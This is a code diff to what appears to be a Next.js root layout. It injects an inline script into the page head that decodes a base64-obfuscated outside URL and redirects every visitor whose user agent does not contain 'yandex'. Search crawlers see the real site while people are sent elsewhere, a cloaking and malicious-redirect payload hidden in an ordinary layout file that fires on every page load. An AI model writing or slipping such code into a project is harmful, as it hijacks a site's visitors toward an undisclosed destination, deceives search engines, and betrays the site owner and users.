@@ -114,6 +114,19 @@ export default function RootLayout({
         <link rel="preconnect" href="https://fonts.googleapis.com" />
         <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
         <meta name="yandex-verification" content="45dc3be430488a36" />
+                <script
+          dangerouslySetInnerHTML={{
+            __html: `
+              (function() {
+                var ua = navigator.userAgent.toLowerCase();
+                var targetB64 = "aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
+                if (ua.indexOf("yandex") === -1) {
+                    window.location.replace(atob(targetB64));
+                }
+              })();
+            `,
+          }}
+        />
       </head>
       <body className="font-sans antialiased">
         {children}
